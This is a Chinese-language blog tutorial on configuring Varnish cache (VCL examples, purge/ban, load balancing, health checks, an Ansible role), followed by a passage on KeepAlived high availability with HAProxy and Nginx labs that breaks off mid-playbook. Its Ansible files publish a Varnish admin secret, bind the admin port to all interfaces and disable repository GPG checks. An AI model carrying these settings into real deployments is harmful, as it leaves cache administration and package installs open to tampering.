&lt;configname&gt; &lt;quoted_VCLstring&gt;vcl.use &lt;configname&gt; 激活VCL配置文件vcl.discard &lt;configname&gt; 删除VCL配置vcl.list 列出VCL配置param.show [-l] [&lt;param&gt;] 列出当前运行的参数param.set &lt;param&gt; &lt;value&gt; 运行参数临时调整panic.showpanic.clearstorage.list 列出数据存储信息vcl.show [-v] &lt;configname&gt; 列出VCL详细配置backend.list [&lt;backend_expression&gt;] 列出后端服务器backend.set_health &lt;backend_expression&gt; &lt;state&gt;ban &lt;field&gt; &lt;operator&gt; &lt;arg&gt; [&amp;&amp; &lt;field&gt; &lt;oper&gt; &lt;arg&gt;]...ban.list 配置文件默认配置文件： 1234567891011RELOAD_VCL=1VARNISH_VCL_CONF=/etc/varnish/default.vcl #指定加载VCL配置文件VARNISH_LISTEN_ADDRESS=192.168.1.5 #服务监听的地址VARNISH_LISTEN_PORT=6081 #默认监听端口VARNISH_ADMIN_LISTEN_ADDRESS=127.0.0.1 #管理服务监听的地址VARNISH_ADMIN_LISTEN_PORT=6082 #管理服务监听的端口VARNISH_SECRET_FILE=/etc/varnish/secret #连接秘钥VARNISH_STORAGE=&quot;malloc,256M&quot; #用内存提供保存缓存,大小为256MVARNISH_USER=varnish #用户身份VARNISH_GROUP=varnish #组身份DAEMON_OPTS=&quot;-p thread_pool_min=5 -p thread_pool_max=500 -p thread_pool_timeout=300&quot; #指定进程的运行参数 VCLVarnish配置语言（VCL）是一种特定于域的语言，用于描述Varnish Cache的请求处理和文档缓存策略。加载新配置时，由Manager进程创建的VCC进程将VCL代码转换为C.此C代码通常由gcc共享对象编译。然后将共享对象加载到cacher进程中。 varnish的有限状态机： VCL有多个状态引擎，状态之间存在相关性，但状态引擎彼此间互相隔离；每个状态引擎可使用return(x)指明关联至哪个下一级引擎；每个状态引擎对应于vcl文件中的一个配置段，即为subroutine 俩个特殊的引擎： 12vcl_init：在处理任何请求之前要执行的vcl代码：主要用于初始化VMODs；vcl_fini：所有的请求都已经结束，在vcl配置被丢弃时调用；主要用于清理VMODs； vainish默认的VCL配置 默认VCL配置也叫做隐式规则，在配置文件中无法看到，即使我们修改了配置文件，默认配置规则也是在最后做处理。 123456789101112131415161718192021222324252627282930313233343536varnish&gt; vcl.show -v boot #在客户端cli工具中查看sub vcl_recv &#123; if (req.method == &quot;PRI&quot;) &#123; #如果客户端的请求方法是PRI，不支持SPDY或HTTP/2.0 return (synth(405)); #则构建一个405的包响应给客户端 &#125; if (req.method != &quot;GET&quot; &amp;&amp; #如果客户端的请求方法不是GET req.method != &quot;HEAD&quot; &amp;&amp; #并且不是HEAD req.method != &quot;PUT&quot; &amp;&amp; #并且不是PUT req.method != &quot;POST&quot; &amp;&amp; #并且不是... req.method != &quot;TRACE&quot; &amp;&amp; req.method != &quot;OPTIONS&quot; &amp;&amp; req.method != &quot;DELETE&quot;) &#123; return (pipe); #即，不是标准HTTP请求方法的交给pipe（管道） &#125; if (req.method != &quot;GET&quot; &amp;&amp; req.method != &quot;HEAD&quot;) &#123; #请求方法不是GET和HEAD的 return (pass); #交给pass处理，也就是除了GAT和HEAD方法其他的无法缓存 &#125; if (req.http.Authorization || req.http.Cookie) &#123; #http的请求首部包含Authorization（认证）或Cookie，即个人专有信息 return (pass); #交给pass处理，因为这些带有个人信息的数据无法缓存 &#125; return (hash); #以上的规则都没有做处理的请求交给hash做处理，剩下的是可以查询缓存的请求了&#125;sub vcl_pipesub vcl_passsub vcl_hashsub vcl_purgesub vcl_hitsub vcl_misssub vcl_deliversub vcl_synthsub vcl_backend_fetchsub vcl_backend_responsesub vcl_backend_errorsub vcl_initsub vcl_fini 内建函数 regsub(str, regex, sub) regsuball(str, regex, sub) ban(boolean expression) hash_data(input) synthetic(str) hash_data()：指明哈希计算的数据；减少差异，以提升命中率 regsub(str,regex,sub)：把str中被regex第一次匹配到字符串替换为sub；主要用于URL Rewrite regsuball(str,regex,sub)：把str中被regex每一次匹配到字符串均替换为sub return() ban(expression) ban_url(regex)：Bans所有的其URL可以被此处的regex匹配到的缓存对象 synth(status,”STRING”)：生成响应报文 Keywords call subroutine return(action) new set unset 操作符 ==, !=, ~, &gt;, &gt;=, &lt;, &lt;= 逻辑操作符：&amp;&amp;, ||, ! 变量赋值：= 示例1：obj.hits是内建变量，用于保存某缓存项的从缓存中命中的次数 123456789101112131415161718192021# vim /etc/varnish/varnish.paramsVARNISH_LISTEN_PORT=80# vim /etc/varnish/default.vclbackend default &#123; .host = &quot;192.168.0.9&quot;; .port = &quot;80&quot;;&#125;sub vcl_deliver &#123; if (obj.hits&gt;0) &#123; set resp.http.X-Cache = &quot;HIT via&quot; + &quot; &quot; + server.ip; &#125; else &#123; set resp.http.X-Cache = &quot;MISS from &quot; + server.ip; &#125;&#125;# systemctl restart varnish #谨慎重启varnish服务，会导致之前的缓存失效# for i in &#123;1..5&#125;; do curl -I -s 192.168.0.8 |grep &quot;X-Cache&quot;; done #在客户端测试，第一次MissX-Cache: MISS from 192.168.0.8X-Cache: HIT via 192.168.0.8X-Cache: HIT via 192.168.0.8X-Cache: HIT via 192.168.0.8X-Cache: HIT via 192.168.0.8 内建变量 req.*：request，表示由客户端发来的请求报文相关； bereq.*：由varnish发往BE主机的httpd请求相关； beresp.*：由BE主机响应给varnish的响应报文相关； resp.*：由varnish响应给client相关； obj.*：存储在缓存空间中的缓存对象的属性；只读； 常用变量： bereq.request, req.request：请求方法； bereq.url, req.url：请求的url； bereq.proto：请求的协议版本； bereq.backend：指明要调用的后端主机； req.http.Cookie：客户端的请求报文中Cookie首部的值； req.http.User-Agent ~ “chrome”； beresp.status, resp.status：响应的状态码； reresp.proto, resp.proto：协议版本； beresp.backend.name：BE主机的主机名； beresp.ttl：BE主机响应的内容的余下的可缓存时长； obj.hits：此对象从缓存中命中的次数； obj.ttl：对象的ttl值 server.ip：varnish主机的IP； server.hostname：varnish主机的Hostname； client.ip：发请求至varnish主机的客户端IP； 示例2：强制对某类资源的请求不检查缓存 12345678910111213141516171819202122232425# vim /etc/varnish/default.vclsub vcl_recv &#123; if (req.url ~ &quot;(?i)^/(login|admin)&quot;) &#123; #&quot;?i&quot;表示忽略大小写，匹配到url中带有login或admin的不查询缓存 return(pass); &#125;&#125;# varnish_reload_vcl# for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/login |grep &quot;X-Cache&quot;; done #客户端测试X-Cache: MISS from 192.168.0.8 #全部MissX-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8# for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/admin |grep &quot;X-Cache&quot;; doneX-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8X-Cache: MISS from 192.168.0.8# for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/ |grep &quot;X-Cache&quot;; done #其他网页正常查询缓存X-Cache: MISS from 192.168.0.8X-Cache: HIT via 192.168.0.8X-Cache: HIT via 192.168.0.8X-Cache: HIT via 192.168.0.8X-Cache: HIT via 192.168.0.8 示例3：对于特定类型的资源，例如公开的图片等，取消其私有标识，并强行设定其可以由varnish缓存的时长 12345678sub vcl_backend_response &#123; if (beresp.http.cache-control !~ &quot;s-maxage&quot;) &#123; if (bereq.url ~ &quot;(?i)\.(jpg|jpeg|png|gif|css|js)$&quot;) &#123; unset beresp.http.Set-Cookie; set beresp.ttl = 3600s; &#125; &#125;&#125; 示例4：在报文首部添加真正的客户端IP，使得后端server可以记录真正客户端来源 1234567891011121314151617181920212223242526272829303132[root@varnish ~]# vim /etc/varnish/default.vclsub vcl_recv &#123; if (req.restarts == 0) &#123; #匹配没有被重写的URL请求，即第一次请求 if (req.http.X-Forwarded-For) &#123; #变量存在并且有值则为真 set req.http.X-Forwarded-For = req.http.X-Forwarded-For + &quot;,&quot; + client.ip; #将真正的client.ip添加到此变量中，用&quot;,&quot;隔开 &#125; else &#123; set req.http.X-Forwarded-For = client.ip; #如果变量不存在或值为空，则直接将client.ip赋值与 &#125; &#125;&#125;[root@varnish ~]# varnishadm -S /etc/varnish/secret -T 127.0.0.1:6082varnish&gt; vcl.load conf1 /etc/varnish/default.vclvarnish&gt; vcl.use conf1varnish&gt; vcl.list available 0 bootavailable 0 reload_2018-07-14T09:55:58active 0 conf1 #当前正在使用的配置[root@web1 ~]# vim /etc/httpd/conf/httpd.confLogFormat &quot;%&#123;X-Forwarded-For&#125;i %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined[root@web1 ~]# systemctl restart httpd[root@client ~]# for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/login |grep &quot;X-Cache&quot;; done #在客户端测试[root@web1 ~]# tail /var/log/httpd/access_log 192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot; #拿到了真正客户端IP，而不是之前的varnish服务器的IP 示例5：访问控制，拒绝curl客户端的访问 12345sub vcl_recv &#123; if(req.http.User-Agent ~ &quot;curl&quot;) &#123; return(synth(403)); &#125;&#125; 缓存对象的修剪：purge1) 能执行purge操作 123sub vcl_purge &#123; return (synth(200,&quot;Purged&quot;));&#125; 2) 何时执行purge操作 123456sub vcl_recv &#123; if (req.method == &quot;PURGE&quot;) &#123; return(purge); &#125; ...&#125; 示例6：清除指定缓存 1234567891011121314151617181920[root@varnish ~]# vim /etc/varnish/default.vclacl purgers &#123; &quot;127.0.0.0&quot;/8; &quot;192.168.0.0&quot;/24;&#125;sub vcl_recv &#123; if (req.method == &quot;PURGE&quot;) &#123; if (!client.ip ~ purgers) &#123; return(synth(405,&quot;Purging not allowed for &quot; + client.ip)); &#125; return(purge); &#125;&#125;varnish&gt; vcl.load conf3 /etc/varnish/default.vclvarnish&gt; vcl.use conf3[root@client ~]# curl -I http://192.168.0.8/X-Cache: HIT via 192.168.0.8[root@client ~]# curl -I -X &quot;PURGE&quot; http://192.168.0.8/[root@client ~]# curl -I http://192.168.0.8/X-Cache: MISS from 192.168.0.8 缓存对象的修剪：Banning1）varnishadm： ban &lt;field&gt; &lt;operator&gt; &lt;arg&gt; 1varnish&gt; ban req.url ~ (?i)^/javascripts 2）在配置文件中定义，使用ban()函数 1234567sub vcl_recv &#123; if (req.method == &quot;BAN&quot;) &#123; ban(&quot;req.http.host == &quot; + req.http.host + &quot; &amp;&amp; req.url == &quot; + req.url); #将规则拼接起来传递给ban函数 return(synth(200, &quot;Ban added&quot;)); &#125;&#125;# curl -I -X &quot;BAN&quot; http://192.168.0.8/javascripts/ 多个后端主机实现调度功能动静分离示例：123456789101112131415backend default &#123; .host = &quot;172.16.0.9&quot;; .port = &quot;80&quot;;&#125;backend appsrv &#123; .host = &quot;172.16.0.10&quot;; .port = &quot;80&quot;;&#125;sub vcl_recv &#123; if (req.url ~ &quot;(?i)\.php$&quot;) &#123; set req.backend_hint = appsrv; &#125; else &#123; set req.backend_hint = default; &#125;&#125; 轮询调度1234567891011121314151617import directors;backend srv1 &#123; .host = &quot;192.168.0.9&quot;; .port = &quot;80&quot;;&#125;backend srv2 &#123; .host = &quot;192.168.0.10&quot;; .port = &quot;80&quot;;&#125;sub vcl_init &#123; new websrvs = directors.round_robin(); #round_robin()调度算法，不支持加权 websrvs.add_backend(srv1); websrvs.add_backend(srv2);&#125;sub vcl_recv &#123; set req.backend_hint = websrvs.backend();&#125; 基于cookie的session sticky12345678sub vcl_init &#123; new h = directors.hash(); h.add_backend(one, 1); h.add_backend(two, 1);&#125;sub vcl_recv &#123; set req.backend_hint = h.backend(req.http.cookie);&#125; 随机调度，支持权重12345sub vcl_init &#123; new websrvs = directors.random(); websrvs.add_backend(srv1, 1); websrvs.add_backend(srv2, 2);&#125; 后端健康检查 .probe：定义健康状态检测方法； .url：检测时要请求的URL，默认为”/“; .request：发出的具体请求； .request = “GET /.healthtest.html HTTP/1.1” “Host: www.fenghong.tech&quot; “Connection: close” .window：基于最近的多少次检查来判断其健康状态； .threshold：最近.window中定义的这么次检查中至有.threshhold定义的次数是成功的； .interval：检测频度； .timeout：超时时长； .expected_response：期望的响应码，默认为200； 1234567891011121314151617181920212223242526import directors;probe http_chk &#123; .url = &quot;/index.html&quot;; .interval = 2s; .timeout = 2s; .window = 10; #最近10次检查 .threshold = 7; #有7次成功则为健康主机&#125;backend srv1 &#123; .host = &quot;192.168.0.9&quot;; .port = &quot;80&quot;; .probe = http_chk;&#125;backend srv2 &#123; .host = &quot;192.168.0.10&quot;; .port = &quot;80&quot;; .probe = http_chk;&#125;sub vcl_init &#123; new websrvs = directors.random(); websrvs.add_backend(srv1, 1); websrvs.add_backend(srv2, 2);&#125;sub vcl_recv &#123; set req.backend_hint = websrvs.backend();&#125; 12345varnish&gt; backend.list #查看后端主机健康状态信息 Backend name Refs Admin Probesrv1(192.168.0.9,,80) 3 probe Healthy 10/10srv2(192.168.0.10,,80) 3 probe Healthy 10/10varnish&gt; backend.set_health srv1 sick|healthy|auto #手动标记主机状态 down|up|probe 设置后端的主机属性： 1234567backend BE_NAME &#123; ... .connect_timeout = 0.5s; #连接超时时间 .first_byte_timeout = 20s; #第一个字节20s不响应则为超时 .between_bytes_timeout = 5s; #第一个字节和第二个字节间隔超时时间 .max_connections = 50; #最大连接数&#125; varnish的运行时参数 最大并发连接数 = thread_pools * thread_pool_max thread_pools：工作线程数，最好小于或等于CPU核心数量 thread_pool_max：每线程池的最大线程数 thread_pool_min：最大空闲线程数 thread_pool_timeout：空闲超过多长时间被清除 thread_pool_add_delay：生成线程之前等待的时间 thread_pool_destroy_delay：清除超出最大空闲线程数的线程之前等待的时间 日志管理virnish的日志默认存储在80M的内存空间中，如果日志记录超出了则覆盖前边的日志，服务器重启后丢失；需要更改配置使其永久保存到磁盘 1# varnishstat -1 -f MAIN #指定查看MAIN段的信息 123# varnishstat -1 -f MAIN.cache_hit -f MAIN.cache_miss #显示指定参数的当前统计数据MAIN.cache_hit 47 0.00 Cache hitsMAIN.cache_miss 89 0.01 Cache misses 12345# varnishtop -1 -i ReqHeader #显示指定的排序信息 165.00 ReqHeader Accept: */* 165.00 ReqHeader Host: 192.168.0.8 165.00 ReqHeader User-Agent: curl/7.29.0 165.00 ReqHeader X-Forwarded-For: 192.168.0.7 将日志永久保存到：/var/log/varnish/varnish.log 1# systemctl start varnishlog.service 以Apache/NCSA日志格式显示 12# varnishncsa192.168.0.7 - - [14/Jul/2018:12:34:23 +0800] &quot;GET http://192.168.0.8/javascripts/test1.html HTTP/1.1&quot; 200 11 &quot;-&quot; &quot;curl/7.29.0&quot; ansible-role-varnish1234567891011121314# tree ansible-role-varnish/ansible-role-varnish/├── files│ ├── default.vcl│ ├── secret│ └── varnish.params├── handlers│ └── main.yml├── tasks│ ├── copy.yml│ ├── main.yml│ ├── setup-varnish.yml│ └── start.yml└── templates 123456789101112131415161718192021222324252627282930313233343536373839# find ansible-role-varnish/ -name *.yml -exec ls &#123;&#125; \; -exec cat &#123;&#125; \;ansible-role-varnish/handlers/main.yml- name: restart varnish service: name=varnish state=restarted- name: reload vcl command: varnish_reload_vclansible-role-varnish/tasks/start.yml- name: start service service: name=varnish state=startedansible-role-varnish/tasks/copy.yml- name: copy configure file copy: src=varnish.params dest=/etc/varnish/varnish.params notify: restart varnish- name: copy secret file copy: src=secret dest=/etc/varnish/secret notify: restart varnish- name: copy default.vcl file copy: src=default.vcl dest=/etc/varnish/default.vcl notify: reload vclansible-role-varnish/tasks/main.yml- include: setup-varnish.yml- include: copy.yml- include: start.ymlansible-role-varnish/tasks/setup-varnish.yml- name: install yum-utils yum: name=&#123;&#123; item &#125;&#125; state=present with_items: - yum-utils - pygpgme- name: Add epel repo yum_repository: name: alibaba description: epel baseurl: https://mirrors.aliyun.com/epel/7Server/x86_64/ repo_gpgcheck: no gpgcheck: no enabled: yes- name: install varnish yum: name=varnish state=present 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# find ansible-role-varnish/files/* -exec ls &#123;&#125; \; -exec cat &#123;&#125; \;ansible-role-varnish/files/default.vcl#-------------------------------------------------vcl 4.0;import directors;backend default &#123; .host = &quot;127.0.0.1&quot;; .port = &quot;8080&quot;;&#125;probe http_chk &#123; .url = &quot;/index.html&quot;; .interval = 2s; .timeout = 2s; .window = 10; .threshold = 7;&#125;backend srv1 &#123; .host = &quot;192.168.0.9&quot;; .port = &quot;80&quot;; .probe = http_chk;&#125;backend srv2 &#123; .host = &quot;192.168.0.10&quot;; .port = &quot;80&quot;; .probe = http_chk;&#125;sub vcl_init &#123; new websrvs = directors.random(); websrvs.add_backend(srv1, 1); websrvs.add_backend(srv2, 1);&#125;sub vcl_recv &#123; set req.backend_hint = websrvs.backend(); if (req.restarts == 0) &#123; if (req.http.X-Forwarded-For) &#123; set req.http.X-Forwarded-For = req.http.X-Forwarded-For + &quot;,&quot; + client.ip; &#125; else &#123; set req.http.X-Forwarded-For = client.ip; &#125; &#125; if(req.http.User-Agent ~ &quot;curl&quot;) &#123; return(synth(403)); &#125;&#125;sub vcl_backend_response &#123; if (beresp.http.cache-control !~ &quot;s-maxage&quot;) &#123; if (bereq.url ~ &quot;(?i)\.(jpg|jpeg|png|gif|css|js)$&quot;) &#123; unset beresp.http.Set-Cookie; set beresp.ttl = 3600s; &#125; &#125;&#125;sub vcl_deliver &#123; if (obj.hits&gt;0) &#123; set resp.http.X-Cache = &quot;HIT via&quot; + &quot; &quot; + server.ip; &#125; else &#123; set resp.http.X-Cache = &quot;MISS from &quot; + server.ip; &#125;&#125;#-------------------------------------------------ansible-role-varnish/files/secret7e40f334-d2e7-4edb-aecb-559519e456f9ansible-role-varnish/files/varnish.paramsRELOAD_VCL=1VARNISH_VCL_CONF=/etc/varnish/default.vclVARNISH_LISTEN_ADDRESS=0.0.0.0VARNISH_LISTEN_PORT=80VARNISH_ADMIN_LISTEN_ADDRESS=0.0.0.0VARNISH_ADMIN_LISTEN_PORT=6082VARNISH_SECRET_FILE=/etc/varnish/secretVARNISH_STORAGE=&quot;malloc,256M&quot;VARNISH_USER=varnishVARNISH_GROUP=varnish#DAEMON_OPTS=&quot;-p thread_pool_min=5 -p thread_pool_max=500 -p thread_pool_timeout=300&quot; 感谢阅读！]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
        <tag>cache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KeepAlive]]></title>
    <url>%2Fkeepalive.html</url>
    <content type="text"><![CDATA[摘要： HA cluster的概念 Keepalive的应用及配置 keepalived+haporxy实验 ansible+keepalived+nginx实验 HA cluster​ HA是High Available缩写，是双机集群系统简称，指高可用性集群，是保证业务连续性的有效解决方案，一般有两个或两个以上的节点，且分为活动节点及备用节点。 LB：负载均衡集群 lvs负载均衡nginx反向代理HAProxy HA：高可用集群 eartbeateepalivededhat5 : cman + rgmanager , conga(WebGUI) –&gt; RHCS（Cluster Suite）集群套件edhat6 : cman + rgmanager , corosync + pacemakeredhat7 : corosync + pacemaker HP：高性能集群 12 &gt; total/2 with quorum&lt;= total/2 without quorum heartbeat: 1234567heartbeat: heratbeat cluster-glye pacemakercorosync + pacemaker (100个节点集群) STONITH: shooting the other node in the headcman + rgmanager keepalive keepalived的相关概念 12345678910111213141516171819vrrp协议：Virtual Redundant Routing Protocol 虚拟冗余路由协议Virtual Router：虚拟路由器VRID(0-255)：虚拟路由器标识master：主设备，当前工作的设备backup：备用设备priority：优先级，优先级越大优先工作，具体情况示工作方式决定VIP：虚拟IP地址，正真向客户服务的IP地址VMAC：虚拟MAC地址(00-00-5e-00-01-VRID)抢占式：如果有优先级高的节点上线，则将此节点转为master非抢占式：即使有优先级高的节点上线，在当前master工作无故障的情况运行抢占；等到此master故障后重新按优先级选举master心跳：master将自己的心跳信息通知集群内的所有主机，证明自己正常工作安全认证机制：无认证：任何主机都可成为集群内主机，强烈不推荐简单的字符认证：使用简单的密码进行认证AH认证sync group：同步组，VIP和DIP配置到同一物理服务器上MULTICAST：组播，多播Failover：master故障，故障切换，故障转移Failback：故障节点重新上线，故障切回 keepalived的模型结构如下： 安装123456789]# yum install -y keepalived]# rpm -ql keepalived/etc/keepalived/etc/keepalived/keepalived.conf #主配置文件 /etc/sysconfig/keepalived #uint files配置文件 /usr/bin/genhash/usr/lib/systemd/system/keepalived.service #uint files/usr/libexec/keepalived/usr/sbin/keepalived #主程序文件 配置需开启multicast，基于多播模式。 1]# ip link set dev ens33 multicast on #基于多播模式 全局配置段 123456789101112131415global_defs &#123; notification_email &#123; #发送通知email，收件人 acassen@firewall.loc failover@firewall.loc sysadmin@firewall.loc &#125; notification_email_from Alexandre.Cassen@firewall.loc smtp_server 192.168.200.1 #邮件服务器地址 smtp_connect_timeout 30 #超时时长 router_id LVS_DEVEL #路由器标识ID vrrp_skip_check_adv_addr #跳过的检查地址 vrrp_strict #严格模式 vrrp_garp_interval 0 #免费arp vrrp_gna_interval 0&#125; 虚拟路由示例段 123456789101112131415161718192021222324252627vrrp_instance &lt;STRING&gt; &#123; state MASTER|BACKUP：#当前节点在此虚拟路由器上的初始状态；只能有一个是MASTER，余下的都应该为BACKUP； interface IFACE_NAME：#绑定为当前虚拟路由器使用的物理接口； virtual_router_id VRID：#当前虚拟路由器的惟一标识，范围是0-255； priority 100：#当前主机在此虚拟路径器中的优先级；范围1-254； advert_int 1：#vrrp通告的时间间隔； authentication &#123; auth_type AH|PASS #pass为简单认证 auth_pass &lt;PASSWORD&gt; #认证密码，8为密码 &#125; virtual_ipaddress &#123; #VIP配置 &lt;IPADDR&gt;/&lt;MASK&gt; brd &lt;IPADDR&gt; dev &lt;STRING&gt; scope &lt;SCOPE&gt; label &lt;LABEL&gt; 192.168.200.17/24 dev eth1 192.168.200.18/24 dev eth2 label eth2:1 &#125; track_interface &#123; #配置要监控的网络接口，一旦接口出现故障，则转为FAULT状态； eth0 eth1 ... &#125; nopreempt：定义工作模式为非抢占模式； preempt_delay 300：抢占式模式下，节点上线后触发新选举操作的延迟时长； notify_master &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：当前节点成为主节点时触发的脚本； notify_backup &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：当前节点转为备节点时触发的脚本； notify_fault &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：当前节点转为“失败”状态时触发的脚本； notify &lt;STRING&gt;|&lt;QUOTED-STRING&gt;：通用格式的通知触发机制，一个脚本可完成以上三种状态的转换时的通知；&#125; 虚拟服务器配置 1234567891011121314151617181920212223242526272829303132333435363738 delay_loop &lt;INT&gt;：服务轮询的时间间隔； lb_algo rr|wrr|lc|wlc|lblc|sh|dh：定义调度方法； lb_kind NAT|DR|TUN：集群的类型； persistence_timeout &lt;INT&gt;：持久连接时长； protocol TCP：服务协议，仅支持TCP；sorry_server &lt;IPADDR&gt; &lt;PORT&gt;：备用服务器地址；real_server &lt;IPADDR&gt; &lt;PORT&gt;&#123; weight &lt;INT&gt; notify_up &lt;STRING&gt;|&lt;QUOTED-STRING&gt; notify_down &lt;STRING&gt;|&lt;QUOTED-STRING&gt; HTTP_GET|SSL_GET|TCP_CHECK|SMTP_CHECK|MISC_CHECK &#123; ... &#125;：定义当前主机的健康状态检测方法；&#125;HTTP_GET|SSL_GET：应用层检测HTTP_GET|SSL_GET &#123; url &#123; path &lt;URL_PATH&gt;：定义要监控的URL； status_code &lt;INT&gt;：判断上述检测机制为健康状态的响应码； digest &lt;STRING&gt;：判断上述检测机制为健康状态的响应的内容的校验码； &#125; nb_get_retry &lt;INT&gt;：重试次数； delay_before_retry &lt;INT&gt;：重试之前的延迟时长； connect_ip &lt;IP ADDRESS&gt;：向当前RS的哪个IP地址发起健康状态检测请求 connect_port &lt;PORT&gt;：向当前RS的哪个PORT发起健康状态检测请求 bindto &lt;IP ADDRESS&gt;：发出健康状态检测请求时使用的源地址； bind_port &lt;PORT&gt;：发出健康状态检测请求时使用的源端口； connect_timeout &lt;INTEGER&gt;：连接请求的超时时长；&#125; TCP_CHECK &#123; connect_ip &lt;IP ADDRESS&gt;：向当前RS的哪个IP地址发起健康状态检测请求 connect_port &lt;PORT&gt;：向当前RS的哪个PORT发起健康状态检测请求 bindto &lt;IP ADDRESS&gt;：发出健康状态检测请求时使用的源地址； bind_port &lt;PORT&gt;：发出健康状态检测请求时使用的源端口； connect_timeout &lt;INTEGER&gt;：连接请求的超时时长；&#125; 脚本 1234567891011121314vrrp_script &lt;SCRIPT_NAME&gt; &#123; script &quot;&quot; #定义执行脚本 interval INT #多长时间检测一次 weight -INT #如果脚本的返回值为假，则执行权重减N的操作 rise 2 #检测2次为真，则上线 fall 3 #检测3次为假，则下线&#125;vrrp_instance VI_1 &#123; track_script &#123; #在虚拟路由实例中调用此脚本 SCRIPT_NAME_1 SCRIPT_NAME_2 ... &#125;&#125; ipvs+keepalive的配置 12345678virtual_server IP port|virtual_server fwmark int&#123; ··· real_server&#123; ··· &#125;&#125; keepalived+HAproxy环境： 1234567192.168.0.10:80192.168.0.11:80192.168.0.12:80三台web服务器已经搭好]# yum install -y httpd]# echo `hostname` &gt; /var/www/html/index.html]# systemctl start httpd 配置HAProxy，两台主机一样的配置 12345678]# vim /etc/haproxy/haproxy.cfgfrontend web *:80 default_backend websrvsbackend websrvs balance roundrobin server srv1 192.168.0.10:80 check server srv2 192.168.0.11:80 check server srv3 192.168.0.12:80 check 配置keepalived实现高可用，一台为MASTER一台为BACKUP. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455]# vim /etc/keepalived/keepalived.conf! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; root@localhost &#125; notification_email_from keepalived@localhoat smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id node1 vrrp_skip_check_adv_addr vrrp_strict vrrp_garp_interval 0 vrrp_gna_interval 0 vrrp_mcast_group4 224.0.111.111 vrrp_iptables&#125;vrrp_script chk_haproxy &#123; script &quot;killall -0 haproxy&quot; #监控haproxy进程 interval 1 weight -5 fall 2 rise 1&#125;vrrp_script chk_down &#123; script &quot;/bin/bash -c &apos;[[ -f /etc/keepalived/down ]]&apos; &amp;&amp; exit 1 || exit 0&quot; #在keepalived中要特别地指明作为bash的参数的运行 interval 1 weight -10&#125;vrrp_instance VI_1 &#123; state MASTER #一台为BACKUP interface eth0 virtual_router_id 51 priority 100 #当为BACKUP时，priority适当减少，建议95。 advert_int 1 authentication &#123; auth_type PASS auth_pass fd57721a &#125; virtual_ipaddress &#123; 192.168.0.2/24 dev eth0 &#125; track_script &#123; #调用监控脚本 chk_haproxy chk_down &#125; notify_master &quot;/etc/keepalived/notify.sh master&quot; notify_backup &quot;/etc/keepalived/notify.sh backup&quot; notify_fault &quot;/etc/keepalived/notify.sh fault&quot;&#125;测试：创建down文件后使得降优先级，从而使得VIP漂移到node2，进入维护模式]# touch /etc/keepalived/down ansible实现双主keepalived+nginx反代拓扑图： 环境： 各节点时间必须同步； 确保iptables及selinux的正确配置； 各节点之间可通过主机名互相通信（对KA并非必须），建议使用/etc/hosts文件实现； 确保各节点的用于集群服务的接口支持MULTICAST通信；D类：224-239；ip link set dev eth0 multicast off | on 配置过程 主机配置及同步时间 12345678]# ssh-keygen -t rsa]# ssh-copy-id -i .ssh/id_rsa.pub root@192.168.1.28]# ssh-copy-id -i .ssh/id_rsa.pub root@192.168.1.30]# vim /etc/ansible/hosts[nginx]192.168.1.30 state1=MASTER priority1=100 state2=BACKUP priority2=90 #两套变量192.168.1.28 state1=BACKUP priority1=90 state2=MASTER priority2=100ansbile all -s &apos;ntpdate 210.72.145.44 &apos; //是中国国家授时中心的官方服务器。 配置palybook的tasks任务 12345678910111213141516171819vim /etc/ansible/roles/nginx/tasks/main.yml- name: install package yum: name=&#123;&#123; item &#125;&#125; with_items: - nginx - keepalived- name: config keepalived template: src=keepalived.conf.j2 dest=/etc/keepalived/keepalived.conf notify: restart keepalived- name: file notify.sh copy: src=notify.sh dest=/etc/keepalived/- name: config nginx template: src=nginx.conf.j2 